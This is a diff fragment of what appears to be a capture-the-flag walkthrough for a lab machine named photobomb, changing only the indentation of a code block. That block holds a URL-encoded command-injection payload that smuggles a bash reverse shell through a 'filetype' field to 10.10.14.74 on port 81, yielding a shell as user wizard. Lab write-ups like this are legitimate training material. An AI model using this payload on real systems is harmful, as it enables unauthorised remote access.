@@ -23,9 +23,9 @@ the web for printing image with input
 ## user
 
 - get rev-shell with bash command (***remember to url encode your payload. I lost many time to try many shell, and figure out that I need to encode the payload :D***):
-		```
-		filetype=png`bash -c 'exec+bash+-i+%26>/dev/tcp/10.10.14.74/81+<%261'`
-		```
+	```
+	filetype=png`bash -c 'exec+bash+-i+%26>/dev/tcp/10.10.14.74/81+<%261'`
+	```
 - we get `wizard@photobomb` with the reverse shell.
 
 
